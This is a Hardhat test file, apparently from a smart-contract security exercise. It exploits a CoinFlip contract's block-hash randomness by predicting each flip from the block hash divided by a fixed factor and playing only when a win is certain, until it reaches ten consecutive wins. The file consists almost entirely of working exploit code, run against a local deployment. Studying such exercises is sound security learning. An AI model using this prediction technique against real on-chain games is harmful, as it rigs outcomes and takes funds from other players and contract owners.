import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers"
import { assert, expect } from "chai"
import { BigNumber } from "ethers"
import { ethers, network, deployments } from "hardhat"
import { developmentChains } from "../../helper-hardhat-config"
import { CoinFlip } from "../../typechain-types"
import { moveBlocks } from "../../utils/moveBlocks"

!developmentChains.includes(network.name)
    ? describe.skip
    : describe("CoinFlip Exploit Testing", () => {
          let exploiter: SignerWithAddress
          let coinflip: CoinFlip
          let factor: BigNumber
          before(async () => {
              await deployments.fixture(["coinflip"])
              exploiter = (await ethers.getSigners())[0]

              coinflip = await ethers.getContract("CoinFlip")
              factor = BigNumber.from(
                  "57896044618658097711785492504343953926634992332820282019728792003956564819968"
              )
          })

          it("Test BlockHash", async () => {
              const currentBlockNum = await ethers.provider.getBlockNumber()
              const prevBlockHash = (await ethers.provider.getBlock(currentBlockNum - 1)).hash

              console.log(`current block num ${currentBlockNum}`)
              console.log(`prev block hash ${prevBlockHash}`)
              const prevBlockValue = ethers.BigNumber.from(prevBlockHash)
              console.log(`prev block value ${prevBlockValue.toString()}`)
              console.log(`prev block hash / factor`, prevBlockValue.div(factor).toString())
          })

          it("Coinflip Exploit", async () => {
              let ctr = 0
              let winCtr = 0
              let consecutiveWins = BigNumber.from(0)

              // we try to mock shifting blocks by 1
              // and checking if the prevBlockHash / factor == 1
              // above is criteria being used to check if coinflip is indeed `true`
              // rig the coin flipping game by playing only when we know we will win (in advance)

              while (consecutiveWins.lt(BigNumber.from(10)) && ctr < 10000) {
                  const currentBlockNum = await ethers.provider.getBlockNumber()
                  const blockHash = await (await ethers.provider.getBlock(currentBlockNum)).hash
                  const blockValue = ethers.BigNumber.from(blockHash)
                  const randNumberExploit = blockValue.div(factor).toString()
                  console.log(`random number exploit is ${randNumberExploit}`)
                  if (randNumberExploit == "1") {
                      const flipTx = await coinflip.flip(true)
                      winCtr++
                      consecutiveWins = await coinflip.consecutiveWins()
                  }

                  ctr++
                  await moveBlocks(1, 1) // shifts to next block & sleeps for 1 millisecond
                  // above creates effect of actual blockchain

                  console.log(`consecutive wins is ${consecutiveWins.toString()}`)
                  console.log(`win counter is ${winCtr}`)
                  console.log(`counter is ${ctr}`)
              }

              expect(consecutiveWins.toString()).equals(
                  winCtr.toString(),
                  "consecutive wins means counter == wins"
              )
          })
      })
